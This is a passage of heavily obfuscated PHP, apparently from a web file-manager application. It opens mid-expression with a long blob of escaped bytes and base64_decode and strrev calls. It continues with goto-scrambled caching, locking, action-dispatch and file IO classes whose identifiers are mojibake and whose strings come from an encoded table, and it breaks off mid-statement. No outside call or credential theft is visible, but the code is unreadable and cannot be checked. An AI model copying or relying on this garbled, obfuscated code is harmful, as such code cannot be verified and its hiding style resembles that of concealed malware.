pÒ‹Øx–æ.vçrÀcDpv')."\130\241\257\4\322\125\127\157\147\257\233\201\332\50\231\330\223\67\344\66\65\174\160\100\54\64\110\164\326\141\174\115\12\107\274\315\314\205\46\135\22\15\347\324\204\324\25\354\200\353\161\137\40\274\100\112\53\246".base64_decode('xBUhdLphHfnIYwTuHMr5cWobg4JOuFHiTLL7sAZbo4ieNWExFYulqkBZiXl4SJstywPXLRWws3zrQw==')."\100\46\353\34\53\376\250\2\17\12\204\32\13\31\212\25\152\103\360\53\177\1\355\223\212\330\150\43\151\274\312\253\371\222\152\250\134\70\320\34\243\142\351\334\323\207\100\152\350\155\214\137\76\147\44\146\145\227".base64_decode('XYrmcYxDnkITrt/i7hGfBCxQfzXkkJ5yAokK590FXVYNRQBYHgwk+DGMhWGhQEdn5L8uTk3yx/9slQ==').base64_decode('UZNUX2Ruv4GWiMrDtj+WKkDzBi4pAj4HeqWN+4VFQaBROuAGF6qAgx/0x9BZMhlEqobuuZLrnRgWCA==')."\306\220\132\112\242\156\273\222\234\102\167\106\321\35\45\301\33\222\233\356\114\62\67\340\160\203\332\117\175\244\300\10\277\226\312\35\273\122\357\266\260\0\362\101\130\43\174\125\131\325\320\243\143\364\112\53\165\221".base64_decode('SBuFo3Z3uBlRmy4rC+ra45cD8kn8Fj9DkFqkOuQMgrs1lebQxwj4J9BLb/5cwbTcuu5UDf6oCFI2+A==')."\xa2\xa\x6a\x70\x5a\x6e\xb4\xc\x60\xb9\xd6\xdf\x45\xab\xc1\xbc\xab\xc2\xb\x2d\xf9\x94\x26\xb6\x1a\x9\x39\x30\x57\x38\x50\xc0\xf\x64\x10\xe\xe1\x6b\xdd\xe\xb8\x3b\x6e\xf6\x22\x8e\xea\x52\x4a\x8a\xb5\x9c\x71\xb\x35\xec\xd3\x4"."\327\136\300\300\207\367\124\270\251\64\205\10\272\212\105\360\242\210\300\271\350\142\254\340\302\237\376\102\277\74\114\247\205\365\25\12\44\267\255\242\344\227\12\157\173\321\240\47\275\304\232\205\262\74\214\226\45\166"."\x2b\xdc\x7c\x8e\xd4\xd5\x61\x9b\x36\xa0\x3f\x3b\x39\xcf\x24\x14\xec\x4f\x80\x84\x5d\x22\x81\x0\x1f\x55\x34\x4d\x60\x1f\xe6\x7d\x8a\xad\x58\x91\x3b\x58\xb6\x73\xd\x66\xef\x8\x90\x70\x69\x7\xd6\x3f\xa0\x6c\xe0\xb1\xb6\x51\x31\x2c"."\372\331\105\365\212\260\113\72\152\222\365\220\170\232\357\244\251\320\66\215\112\10\316\276\70\125\140\147\46\166\304\334\370\152\100\10\73\261\164\141\57\43\70\105\7\313\10\346\235\326\202\106\204\6\130\152\215\353"."\17\7\3\211\157\234\142\76\200\37\140\260\100\165\141\231\42\172\72\306\176\201\270\127\172\202\16\276\326\213\35\1\221\146\213\105\122\147\114\350\7\56\144\300\210\145\167\306\335\345\316\233\240\223\115\62\32\105"."\107\264\304\247\226\113\134\107\20\4\151\216\304\73\330\62\200\240\232\6\107\45\12\240\121\51\52\233\225\241\226\121\211\120\30\313\241\67\71\31\367\101\212\222\37\237\222\142\152\70\214\363\365\232\370\374\14\146"."\43\17\323\132\150\341\350\27\112\106\7\156\234\203\161\272\152\164\41\33\117\43\214\265\121\7\74\37\5\77\170\105\141\70\370\3\3\16\174\326\201\56\26\331\371\54\313\75\150\1\122\363\306\301\232\106\304\206"."\132\264\140\273\2\314\250\145\313\20\262\123\64\242\225\73\263\340\136\253\362\305\34\167\24\6\42\326\5\101\131\203\205\26\26\365\254\3\131\50\73\350\313\213\66\162\10\165\210\231\102\33\231\362\151\353\251\12"."\xd4\xfd\x8f\xa5\x13\xb7\xbe\x48\xff\x7\xfa\x13\x76\x8\x82\x93\x9a\xd1\xd9\x50\x65\x34\xd5\xc2\x92\x60\x1\xce\x77\xdd\xf1\x83\xaf\x5\xfb\xe4\xb0\x24\x97\x6c\x98\x36\x7d\x96\xb8\xe4\xe6\x3d\xc7\xfd\xc\xd1\xf7\xd2\xf1\x4f\x23\x19"."\xa6\x8c\x17\x24\xe1\xab\xf0\x75\x59\xfa\xca\xac\x38\xa8\x51\xa2\xd5\xf1\x32\x79\x17\x58\x10\xea\x36\xe1\xfb\x5f\x8d\x4\x4f\x25\xfd\x1c\x67\x12\x36\x1\x59\xc9\x98\x4\x2c\x20\xd0\x2\x31\xaa\xe0\x4f\x50\x98\x93\x6c\xe\xe3\x34\x78"."\147\337\340\37\306\363\12\37\316\326\157\241\117\124\152\321\377\177\233\21\230\217\60\324\156\350\1\320\205\202\52\174\205\317\272\352\251\244\334\243\62\351\112\2\72\347\345\61\253\327\75\262\55\300\223\5\355\137".strrev('U€Úí±êÙ+‹V6Tyî'."\n".'X=wuãôªOëÂüGNU”¬ğ±Ì–|ÁĞòœ;0ÛìÔÑ,')."\55\166\343\337\51\233\116\201\265\205\355\61\305\14\42\6\301\121\141\235\145\53\20\40\362\134\203\16\151\74\44\201\21\371\123\163\202\126\5\161\75\124\373\250\274\14\245\2\216\233\374\241\67\51\270\13\31\64".base64_decode('li3jWnjlWXziARUkDpPyotHOBqkvGdjIdgT5YPR0sFc7IBvwKliZwtR4iqlZHxoK0v1hoFxZlk4gzg==').strrev('´¬Ì+?¨ò$KÔÉ™Œ¢'."\r".'m¾!ÒRÆCÊS…ódX÷CQ×=:!ü°ªCÅÀI '."\n".'Ri)â	èï')."\x76\x69\x21\xd4\x43\xaf\xb1\xc0\x88\xb0\xf5\x88\x96\x1a\x2c\x31\x23\xae\x42\xe0\x43\x69\x38\x44\x55\x69\x56\xb\x34\x19\x54\x1a\x57\xb8\x12\x90\x29\xc9\xf4\x8e\x82\x74\x2\x82\x76\xee\xe8\x7a\x39\xcc\xc3\x16\xa5\xe5\xe2\x14\xb7\xeb".base64_decode('B1QFWCpz595BVF1bHa2z3n5iKuEthyVGIly1R/cGhPNLFGdugOm7d/Q5PJl5LIKuntgKHu9vEpRslg==')."\317\260\342\113\102\331\270\254\273\0\217\15\231\324\65\136\245\210\250\336\127\130\64\122\315\223\67\40\257\46\206\52\270\302\202\204\207\106\143\302\344\46\250\4\145\150\134\302\0\315\201\31\173\322\20\132\63\101"."\75\222\212\62\361\121\227\40\263\157\250\41\322\163\160\36\25\11\160\34\322\115\122\121\32\130\100\145\62\44\142\231\371\54\100\221\74\204\11\340\203\11\224\37\54\71\240\353\254\66\141\241\202\221\350\363\246\304"."\323\231\40\264\312\75\243\225\347\146\243\122\314\22\3\25\263\356\233\210\105\141\33\4\270\256\17\301\225\267\313\126\34\33\66\25\307\210\152\340\275\145\161\171\11\102\142\305\350\130\353\325\65\244\47\131\241\154".strrev('0Õ““ğÿ„—ö“-¶¢2àØü€|‹‘«ºû…%™,\'†ÉÕV~YÂ4V'."\r".'ß¶ÊÒí…³\'O¸@£')."\31\26\262\114\12\364\360\347\275\153\44\376\124\42\116\47\334\12\24\375\166\215\365\73\74\333\26\314\240\310\263\26\26\377\360\4\266\112\230\52\351\353\27\302\241\271\65\1\72\0\267\216\226\326\112\150\11\115".base64_decode('NwQ0Bq+EC7o/bFo6Cuq7VMkGywiJdytaGOO1rmXJS4zERJBw5AWvS1hdGKNEBKZPzJIShJMa65mZRg==')."\47\312\62\151\125\124\273\204\144\224\213\276\126\10\176\341\43\37\1\356\156\4\45\343\375\145\117\111\146\6\124\366\134\175\226\305\203\160\302\226\100\154\311\27\165\50\143\34\324\22\375\343\51\250\366\34\146\106"."\xd5\x93\x6d\x6a\x3e\x69\xc7\x2f\xe6\xe3\xc\xca\xd1\x41\x67\x70\xe4\xa\xa7\x45\x82\xbe\xc0\xb2\x0\xad\x8c\xb\x73\x1b\x5c\x98\x77\xb8\x38\x95\x4b\xfc\x24\x86\xab\xc7\xc9\x64\xbb\x5c\xaa\x80\xca\x1c\x7\x30\x28\x80\x30\x54\xa4\x20".base64_decode('CW8Tcb/YyrD4dYKXKp91IGI5lL9dZG8XGmgMTg7E+FTDWJGDEE6COZcU1hjQNpN7ncR1ZAtx/knrEw==')."\113\14\215\165\6\300\101\167\54\234\26\250\155\245\5\167\147\351\374\153\113\42\273\0\102\361\25\67\13\54\154\322\45\24\47\236\277\215\233\41\134\371\43\234\227\255\44\26\236\243\342\11\164\232\23\113\261\110"."\137\326\60\202\31\22\23\55\325\261\167\55\132\4\160\276\304\300\34\332\361\164\321\315\342\162\174\305\126\173\61\203\275\145\70\207\136\106\37\222\247\362\247\355\37\240\344\261\57\255\170\41\302\22\247\354\150\76"."\242\125\310\203\153\124\61\33\116\202\71\271\36\147\311\153\14\253\146\42\123\61\57\116\202\171\313\222\151\146\141\117\103\310\147\312\105\143\234\346\225\23\217\54\325\313\4\31\0\331\26\261\30\165\74\172\126\104"."\56\377\34\141\36\73\66\132\333\127\256\105\305\75\225\361\152\121\21\171\334\132\160\154\233\244\256\44\17\151\112\5\11\310\17\310\313\145\55\117\253\160\134\217\313\204\223\164\310\142\321\132\226\54\236\375\127\266"."\xe\x8\x55\x1c\xc5\x86\xf5\xd8\xde\x6\x17\x9\xc3\x7d\x96\x12\x2f\xa6\x43\x79\xea\x15\xc\x64\xe7\xee\x34\xa1\x21\xbc\x47\xb7\x13\x7\x47\xcb\x1c\x54\x53\xde\xcb\x17\x5\xa7\xc8\x15\x3d\x5c\x3b\xe0\xba\xb8\x7c\xe1\x99\xa5\x3e\xe3".base64_decode('RP/feG2imWpCMBOCQNGFNU6nH8nyrTWiJeB9Gp9o9f7uXb/ZvumP2zdcvf23p2w97xLHtjOv23bF6Q==').base64_decode('2644e+sZV2+99HqcsO3KX7936W9nS9tOPxEmXnTqO/fdhf/deu297254YPv9GzDK1o33vrvxuu0XXA==').strrev('·èï ¯¡7MaÉÄŞxĞ.ĞìavC`>=ÎÉà:éÅµîø¹o”ùlµ^ŸFm‡ü]·»´í¿')."\x4d\x33\x4d\x2a\x86\x80\x5a\x8d\x30\x91\x8a\x88\x5c\x39\x9\x36\x7\x20\xc4\x4f\x68\x60\xf\xa1\x43\x3\xc4\xcb\x48\xe6\xa0\x20\x39\xea\x83\x8b\xd9\xb0\x82\x53\x91\xa4\xb2\x44\xe0\x61\x4\x8b\x84\xca\x4f\x1d\xda\x8b\xb6\x43\x46\xe"."\0\313\320\270\66\102\130\11\275\340\304\353\3\17\17\10\131\354\152\40\77\371\47\274\54\132\120\40\103\106\303\215\123\334\344\322\203\23\225\341\44\117\206\62\243\107\222\75\211\306\36\363\366\372\103\45\220\335".base64_decode('SV4EsoTGm009wUjMvzgQjoTLkno94XB/MOTDhtNlySiXYKxSltTbGewZL83f7Ql0laVB4xVozk1ftQ==').base64_decode('xUmBXlRLT1cXtZ4sr0XAu4DXBJ2p8i3zQkaju8I2yy56whCW6WATH4lRcmyzSyjCuucgdrNB31RmgQ==')."\102\331\352\104\120\36\240\341\111\17\51\54\104\375\234\366\370\27\162\301\301\264\141\324\40\273\365\232\52\214\3\174\202\354\262\234\64\13\160\64\160\220\50\23\30\122\234\246\21\240\266\42\365\304\23\341\362\23".base64_decode('AZTKyQFrPZ96OVmuxYUdfyzfLJJNtDzCYZL8/wD30qdcvscAAA==')."".""."", 10, -8))); goto dòÂË”Ô’; bÎƒÔÃÓ¼: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b£„…Úá«‘, $CÌ¾ÉÄ¬‡Å) { $B­Éğ®¨®ô =& $_SERVER[‡’¶øåüç˜]; $this->cachePath = $b£„…Úá«‘[$B­Éğ®¨®ô[75]]; $this->prefix = $B­Éğ®¨®ô[767]; $this->cacheTime = $CÌ¾ÉÄ¬‡Å; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($B‰¶Ğ”°¥ ) { $bíêŒ»‚ =& $_SERVER[‡’¶øåüç˜]; $B‰¶Ğ”°¥  = str_replace(array($bíêŒ»‚[768], $bíêŒ»‚[93], $bíêŒ»‚[69]), $bíêŒ»‚[769], $B‰¶Ğ”°¥ ); return $this->cachePath . $bíêŒ»‚[770] . $B‰¶Ğ”°¥  . $bíêŒ»‚[771]; } public function set($a ·ºø‰‡, $b˜‡ëÆš¿°, $Eãˆ—Ö¼ˆ = false) { $eÆäœËç¬¾ = $this->getFile($a ·ºø‰‡); if (file_put_contents($eÆäœËç¬¾, $this->prefix . $b˜‡ëÆš¿°, LOCK_EX)) { return !0; } @unlink($eÆäœËç¬¾); return !1; } public function get($A®•º¡ãò) { $Dù—’Ä¯³ = $this->getFile($A®•º¡ãò); if (file_exists($Dù—’Ä¯³) && filemtime($Dù—’Ä¯³) < time() - $this->cacheTime) { @unlink($Dù—’Ä¯³); return !1; } $eŞª›ãÓÃ‘ = @file_get_contents($Dù—’Ä¯³); return substr($eŞª›ãÓÃ‘, strlen($this->prefix)); } public function remove($fÆåŞ‚èŸ·) { $EæÛœ²˜‹ó = $this->getFile($fÆåŞ‚èŸ·); return @unlink($EæÛœ²˜‹ó); } public function deleteAll() { $B¥ÌËÇ« Ö =& $_SERVER[‡’¶øåüç˜]; $d¥„ÕŒªï = scandir($this->cachePath); foreach ($d¥„ÕŒªï as $DÈ¢Îº…„Ğ) { $aøšê¥«õ = $this->cachePath . $DÈ¢Îº…„Ğ; if (strpos($aøšê¥«õ, $B¥ÌËÇ« Ö[771]) && strpos($aøšê¥«õ, $B¥ÌËÇ« Ö[772])) { @unlink($aøšê¥«õ); } } } public function clearTimeout() { $dÊÁÏê¦Ôø =& $_SERVER[‡’¶øåüç˜]; $Cïª‘•…´ê = scandir($this->cachePath); foreach ($Cïª‘•…´ê as $a¢øŠ–Ğ´¼) { $BÃ´³òáÒ = $this->cachePath . $a¢øŠ–Ğ´¼; if (strpos($BÃ´³òáÒ, $dÊÁÏê¦Ôø[771]) && strpos($BÃ´³òáÒ, $dÊÁÏê¦Ôø[772]) && filemtime($BÃ´³òáÒ) < time() - $this->cacheTime) { @unlink($BÃ´³òáÒ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aŠ¦›¼êø; EŒŸÄõÕ: self::$timeout = $f½Ğ„ÔÁßâ[$eÚÉº‘ß›¨[773]] ? $f½Ğ„ÔÁßâ[$eÚÉº‘ß›¨[773]] : 10; $cßÒãŒ¢µÏ = _get($GLOBALS[$eÚÉº‘ß›¨[6]], $eÚÉº‘ß›¨[774]); $f„¨¾©£ö = $f½Ğ„ÔÁßâ[$eÚÉº‘ß›¨[760]] ? $f½Ğ„ÔÁßâ[$eÚÉº‘ß›¨[760]] : $eÚÉº‘ß›¨[171]; goto DØ’¥Á°ï½; aŠ¦›¼êø: $eÚÉº‘ß›¨ =& $_SERVER[‡’¶øåüç˜]; if (self::$handle) { return self::$handle; } $f½Ğ„ÔÁßâ = $GLOBALS[$eÚÉº‘ß›¨[6]][$eÚÉº‘ß›¨[341]]; goto EŒŸÄõÕ; DØ’¥Á°ï½: if ($f„¨¾©£ö == $eÚÉº‘ß›¨[17] && $cßÒãŒ¢µÏ == $eÚÉº‘ß›¨[9]) { $f„¨¾©£ö = $eÚÉº‘ß›¨[171]; } switch ($f„¨¾©£ö) { case $eÚÉº‘ß›¨[763]: self::$handle = new CacheLockRedis(); break; case $eÚÉº‘ß›¨[764]: self::$handle = new CacheLockMemcached(); break; case $eÚÉº‘ß›¨[17]: self::$handle = new CacheLockDatabase(); break; case $eÚÉº‘ß›¨[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a»«ª³¹š‹; a»«ª³¹š‹: } private static function key($b‘“ëâŒ†) { return $_SERVER[‡’¶øåüç˜][775] . Cache::key($b‘“ëâŒ†); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($E˜¿Àê‰˜» = '') { self::$errorMsg = $E˜¿Àê‰˜»; } public static function lockGlobal($b¾Âï¥¦ñˆ, $EŠ‡ÕÅÕ) { return self::lock($b¾Âï¥¦ñˆ, $EŠ‡ÕÅÕ, !0); } public static function lock($B¢†š×Ìœ±, $eàÂš¯šŒæ = false, $añßÛĞ»ğ¢ = false) { goto c–×š´ë÷•; c–×š´ë÷•: $fÕø¯«ëô =& $_SERVER[‡’¶øåüç˜]; $fŒÀÎ‘Í•¦ = self::init(); $eà‹Ä¸ˆö = self::key($B¢†š×Ìœ±); goto eÜÎ¡…±¶ˆ; Aãªµö¸‘—: if (!$añßÛĞ»ğ¢) { self::$lockItem[$eà‹Ä¸ˆö] = !0; } return $E˜ŠÁ²Š×Ï; goto eËÅ®èçÈ; eÜÎ¡…±¶ˆ: $eàÂš¯šŒæ = $eàÂš¯šŒæ ? $eàÂš¯šŒæ : self::$timeout; $E˜ŠÁ²Š×Ï = $fŒÀÎ‘Í•¦->lock($eà‹Ä¸ˆö, $eàÂš¯šŒæ); if (!$E˜ŠÁ²Š×Ï) { $b¯ºŒÄÛÊä = $fÕø¯«ëô[776] . $eàÂš¯šŒæ . $fÕø¯«ëô[67] . self::$errorMsg . $fÕø¯«ëô[67] . get_caller_msg(); $d—º¤·¸¸› = "\114\x6f\143\x6b\x20\141\x63\164\151\x6f\156\72\40{$eà‹Ä¸ˆö}\x20\164\x69\155\145\157\x75\164\54\x6f\166\145\x72\40{$eàÂš¯šŒæ}\40\x73"; $d—º¤·¸¸› = self::$errorMsg ? self::$errorMsg : $DÏŞ‘¸â¸ó; write_log($b¯ºŒÄÛÊä, $fÕø¯«ëô[777]); show_json($d—º¤·¸¸›, !1); } goto Aãªµö¸‘—; eËÅ®èçÈ: } public static function lockGet($BÑ÷¤¦ğî×) { $d‚•‚ÂÖ‚ = self::key($BÑ÷¤¦ğî×); if (self::$lockItem[$d‚•‚ÂÖ‚]) { return self::$lockItem[$d‚•‚ÂÖ‚]; } return self::init()->lockGet($d‚•‚ÂÖ‚); } public static function unlock($EÚÉÛÉ°) { $d‚õˆ¿ÈŠâ = self::key($EÚÉÛÉ°); self::$lockItem[$d‚õˆ¿ÈŠâ] = null; return self::init()->unlock($d‚õˆ¿ÈŠâ); } public static function unlockRuntime() { $d ¦Â‘ÂŠ… =& $_SERVER[‡’¶øåüç˜]; $a±’èÈŠ¶ = self::init(); $cßôŠñµß = !1; foreach (self::$lockItem as $c²ÅôÆë¯¯ => $cˆŠõ„å¨) { if (!$cˆŠõ„å¨) { continue; } $a±’èÈŠ¶->unlock($c²ÅôÆë¯¯); if (!$cßôŠñµß) { $cßôŠñµß = !0; write_log($d ¦Â‘ÂŠ…[778] . $c²ÅôÆë¯¯ . $d ¦Â‘ÂŠ…[67] . get_caller_msg(), $d ¦Â‘ÂŠ…[777]); continue; } write_log($d ¦Â‘ÂŠ…[778] . $c²ÅôÆë¯¯, $d ¦Â‘ÂŠ…[777]); } self::fileUnlockAll(); } public static function fileLock($däÕ‹÷ÀÈÂ) { goto Eôî„¼ÈŒİ; Eôî„¼ÈŒİ: $dã©çˆø¬¦ =& $_SERVER[‡’¶øåüç˜]; if (!$GLOBALS[$dã©çˆø¬¦[779]]) { $GLOBALS[$dã©çˆø¬¦[779]] = array(); } $GLOBALS[$dã©çˆø¬¦[779]][$däÕ‹÷ÀÈÂ] = !1; goto DÃ†‰µùÎÀ; DÃ†‰µùÎÀ: $dƒÎõæ± = fopen(DATA_PATH . $däÕ‹÷ÀÈÂ . $dã©çˆø¬¦[780], $dã©çˆø¬¦[781]); if (!$dƒÎõæ±) { return !1; } $GLOBALS[$dã©çˆø¬¦[779]][$däÕ‹÷ÀÈÂ] = $dƒÎõæ±; goto a÷ñùçİ; bø„¶Ç£Ó: return !1; goto Bá¥ ãÓÚÕ; a÷ñùçİ: if (flock($dƒÎõæ±, LOCK_EX)) { return !0; } self::unlock($däÕ‹÷ÀÈÂ); show_json($dã©çˆø¬¦[782], !1); goto bø„¶Ç£Ó; Bá¥ ãÓÚÕ: } public static function fileUnlock($aãÌ’Ÿğçî) { $b†ôôïªÚÄ =& $_SERVER[‡’¶øåüç˜]; $dá°ÜÚ‹Ğ  = $GLOBALS[$b†ôôïªÚÄ[779]][$aãÌ’Ÿğçî]; if (!$dá°ÜÚ‹Ğ ) { return; } $GLOBALS[$b†ôôïªÚÄ[779]][$aãÌ’Ÿğçî] = !1; flock($dá°ÜÚ‹Ğ , LOCK_UN); fclose($dá°ÜÚ‹Ğ ); } public static function fileUnlockAll() { $dŠ¤µöìï„ =& $_SERVER[‡’¶øåüç˜]; if (!$GLOBALS[$dŠ¤µöìï„[779]]) { return; } foreach ($GLOBALS[$dŠ¤µöìï„[779]] as $F‡ÀÜŒÂ½Á => $c¾¦·Õª–×) { if (!$c¾¦·Õª–×) { continue; } $GLOBALS[$dŠ¤µöìï„[779]][$F‡ÀÜŒÂ½Á] = !1; flock($c¾¦·Õª–×, LOCK_UN); fclose($c¾¦·Õª–×); } $GLOBALS[$dŠ¤µöìï„[779]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto D†‹ÙŞÀ ; F¯§çâĞ¦: function Action($B‰±áåÊ•µ = '') { goto B÷æŸ´«ˆ; e©«³óÁŒâ: if (isset($fà‚·ßÎÈ¦[$fÛõŸ»ïµ²])) { return $fà‚·ßÎÈ¦[$fÛõŸ»ïµ²]; } if (is_file($c„µ‹¥àÛ¶)) { include_once $c„µ‹¥àÛ¶; } if (!class_exists($B¾çßî¦âí)) { return actionCallError("\x5b{$B‰±áåÊ•µ}\40\x3d\76\x20{$B¾çßî¦âí}\x5d\x20\x63\154\141\163\x73\x20\x6e\157\x74\x20\x65\170\151\x73\x74\163\x21"); } goto E¿÷ŠˆÁ®Ë; A¿É¾†š¥ˆ: $f¹èÑœã = strtolower($bÜÍ¶ÉÔ[0]); if (substr($f¹èÑœã, -6) == $eŒŸŸã‡ì¦[6]) { $B‰±áåÊ•µ = substr($bÜÍ¶ÉÔ[0], 0, -6); $B¾çßî¦âí = $B‰±áåÊ•µ . $eŒŸŸã‡ì¦[7]; $c„µ‹¥àÛ¶ = $eŒŸŸã‡ì¦[8]; if (isset($bÜÍ¶ÉÔ[1]) && substr(strtolower($bÜÍ¶ÉÔ[1]), -5) == $eŒŸŸã‡ì¦[9]) { $B¾çßî¦âí = $B‰±áåÊ•µ . $bÜÍ¶ÉÔ[1]; $c„µ‹¥àÛ¶ = $eŒŸŸã‡ì¦[10] . $bÜÍ¶ÉÔ[1] . $eŒŸŸã‡ì¦[11]; } else { if (count($bÜÍ¶ÉÔ) == 3) { $B¾çßî¦âí = $B‰±áåÊ•µ . $bÜÍ¶ÉÔ[1] . $bÜÍ¶ÉÔ[2]; $c„µ‹¥àÛ¶ = $eŒŸŸã‡ì¦[12] . $bÜÍ¶ÉÔ[1] . $eŒŸŸã‡ì¦[13] . $bÜÍ¶ÉÔ[2] . $eŒŸŸã‡ì¦[11]; } } $c„µ‹¥àÛ¶ = PLUGIN_DIR . $B‰±áåÊ•µ . $eŒŸŸã‡ì¦[4] . $c„µ‹¥àÛ¶; } else { if (substr($f¹èÑœã, -5) == $eŒŸŸã‡ì¦[9]) { $B‰±áåÊ•µ = substr($bÜÍ¶ÉÔ[0], 0, -5); return Model($B‰±áåÊ•µ); } else { $B¾çßî¦âí = $bÜÍ¶ÉÔ[0] . $bÜÍ¶ÉÔ[1]; $c„µ‹¥àÛ¶ = CONTROLLER_DIR . $bÜÍ¶ÉÔ[0] . $eŒŸŸã‡ì¦[4] . $bÜÍ¶ÉÔ[1] . $eŒŸŸã‡ì¦[14]; } } $fÛõŸ»ïµ² = strtolower($B¾çßî¦âí); goto e©«³óÁŒâ; B÷æŸ´«ˆ: $eŒŸŸã‡ì¦ =& $_SERVER[úÎ]; static $fà‚·ßÎÈ¦ = array(); $c¬Äï¡µÔ = $B‰±áåÊ•µ; goto Bù‘İ§ö; E¿÷ŠˆÁ®Ë: $fà‚·ßÎÈ¦[$fÛõŸ»ïµ²] = new $B¾çßî¦âí(); $fà‚·ßÎÈ¦[$c¬Äï¡µÔ] = $fà‚·ßÎÈ¦[$fÛõŸ»ïµ²]; return $fà‚·ßÎÈ¦[$fÛõŸ»ïµ²]; goto dÇ šÈè¦ª; Bù‘İ§ö: if (isset($fà‚·ßÎÈ¦[$c¬Äï¡µÔ])) { return $fà‚·ßÎÈ¦[$c¬Äï¡µÔ]; } $B‰±áåÊ•µ = trim(str_replace($eŒŸŸã‡ì¦[4], $eŒŸŸã‡ì¦[5], $B‰±áåÊ•µ), $eŒŸŸã‡ì¦[4]); $bÜÍ¶ÉÔ = explode($eŒŸŸã‡ì¦[5], $B‰±áåÊ•µ); goto A¿É¾†š¥ˆ; dÇ šÈè¦ª: } function ActionApply($föØŒõ¯Ì¥, $fÒÌß§®š¡ = array()) { goto E„ Ÿö¢à; A”Ì¸æ”„—: if (!is_object($d»…Ñ¸…š™) || !method_exists($d»…Ñ¸…š™, $b›ì÷©¶¾)) { return actionCallError("{$föØŒõ¯Ì¥}\40\155\x65\164\150\157\x64\40\x6e\157\164\x20\145\170\x69\163\x74\163\41"); } $fõÜì„  = call_user_func_array(array($d»…Ñ¸…š™, $b›ì÷©¶¾), $fÒÌß§®š¡); return $fõÜì„ ; goto eÍŠš·; E„ Ÿö¢à: if (is_array($föØŒõ¯Ì¥)) { return call_user_func_array($föØŒõ¯Ì¥, $fÒÌß§®š¡); } if (function_exists($föØŒõ¯Ì¥)) { return call_user_func_array($föØŒõ¯Ì¥, $fÒÌß§®š¡); } $fä¦ì‹¿ÄÈ = strrpos($föØŒõ¯Ì¥, $_SERVER[úÎ][5]); goto bà®‡¤«˜º; bà®‡¤«˜º: $A‰õèˆà‡° = substr($föØŒõ¯Ì¥, 0, $fä¦ì‹¿ÄÈ); $b›ì÷©¶¾ = substr($föØŒõ¯Ì¥, $fä¦ì‹¿ÄÈ + 1); $d»…Ñ¸…š™ = Action($A‰õèˆà‡°); goto A”Ì¸æ”„—; eÍŠš·: } function actionCallError($BÒÀÍ¯ª§) { return write_log($BÒÀÍ¯ª§, $_SERVER[úÎ][15]); } goto bŠù˜¼¦«µ; cä½‰ËÉõ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fÚ™ËØ¥ò±, $cˆÙ‰—­ğ) { $D²„ò§¾Ö­ = self::driverMake($cˆÙ‰—­ğ[0]); if (method_exists($D²„ò§¾Ö­, $fÚ™ËØ¥ò±)) { return @call_user_func_array(array($D²„ò§¾Ö­, $fÚ™ËØ¥ò±), $cˆÙ‰—­ğ); } if (method_exists($D²„ò§¾Ö­, $_SERVER[‡’¶øåüç˜][1001])) { return @call_user_func_array(array($D²„ò§¾Ö­, $fÚ™ËØ¥ò±), $cˆÙ‰—­ğ); } else { if (method_exists(self, $fÚ™ËØ¥ò±)) { return @call_user_func_array(array(self, $fÚ™ËØ¥ò±), $cˆÙ‰—­ğ); } else { call_user_func_array(array(parent, $fÚ™ËØ¥ò±), $cˆÙ‰—­ğ); } } } public static function init($bÚœå‚îëŞ) { return self::driverMake($bÚœå‚îëŞ); } public static function copy($C¹ÌÒêäè¹, $Dƒ™àİõ†ƒ, $CÅÊ‰¼†‹› = false, $d¼ìÈÄ´´ï = false) { return self::copyMove($C¹ÌÒêäè¹, $Dƒ™àİõ†ƒ, $CÅÊ‰¼†‹›, $_SERVER[‡’¶øåüç˜][503], $d¼ìÈÄ´´ï); } public static function move($B“¬‡›­ƒ», $EÖÁˆ÷¤, $c™¤›èìöŒ = false, $AÀ´Ş¿Š†¤ = false) { return self::copyMove($B“¬‡›­ƒ», $EÖÁˆ÷¤, $c™¤›èìöŒ, $_SERVER[‡’¶øåüç˜][505], $AÀ´Ş¿Š†¤); } public static function saveFile($a“å¯ÊÉôÀ, $B¯åáì‚º÷, $bœ…Ìèïø = true) { goto AÔÄÖäªÕ‰; AÔÄÖäªÕ‰: $bÌ¹ô„ñÑğ =& $_SERVER[‡’¶øåüç˜]; $FÄ¸ÖÚ‰‰å = self::info($B¯åáì‚º÷); $C³Æ›ó³ºæ = self::driverMake($a“å¯ÊÉôÀ); goto e©Ê³»‡×; BõôŞ´öä¶: $b¨ÃòŒš±„ = self::copyFile($C³Æ›ó³ºæ, $a“å¯ÊÉôÀ, $aŸÁ‡º¬áÕ, $C‚‡À³Ñ§», $FÄ¸ÖÚ‰‰å[$bÌ¹ô„ñÑğ[28]], $fç¯ã¨ßíà); if ($E «°­å) { $b¨ÃòŒš±„ = $E «°­å->getPathOuter($b¨ÃòŒš±„); } return $b¨ÃòŒš±„; goto EÂ¹«Ë×Â; e©Ê³»‡×: $aŸÁ‡º¬áÕ = self::driverMake($B¯åáì‚º÷); $E «°­å = !1; if ($aŸÁ‡º¬áÕ->pathParse[$bÌ¹ô„ñÑğ[1002]]) { $f“†Ÿåœõµ = $aŸÁ‡º¬áÕ->pathParse[$bÌ¹ô„ñÑğ[1002]]; $E «°­å = $aŸÁ‡º¬áÕ; $aŸÁ‡º¬áÕ = self::driverMake($f“†Ÿåœõµ); } goto CÅ¿Õ¶ÓÅ‡; CÅ¿Õ¶ÓÅ‡: $C‚‡À³Ñ§» = $aŸÁ‡º¬áÕ->pathFather($B¯åáì‚º÷); $fç¯ã¨ßíà = !0; if (!$bœ…Ìèïø && self::driverIsSame($C³Æ›ó³ºæ, $aŸÁ‡º¬áÕ)) { $fç¯ã¨ßíà = !1; } goto BõôŞ´öä¶; EÂ¹«Ë×Â: } private static function copyMove($Aõ¤”ˆ±¨, $Aé˜Çë‰ìá, $bÄä¥†ğ²ë, $BË¿ØØ·ìç, $Eß´‘Š¼† = false) { goto F¾‡©‘†; F¾‡©‘†: $F•»‹Œ‡—é =& $_SERVER[‡’¶øåüç˜]; if (!$Aõ¤”ˆ±¨ || $Aõ¤”ˆ±¨ == $F•»‹Œ‡—é[8] || !$Aé˜Çë‰ìá) { return !1; } ignore_timeout(); goto 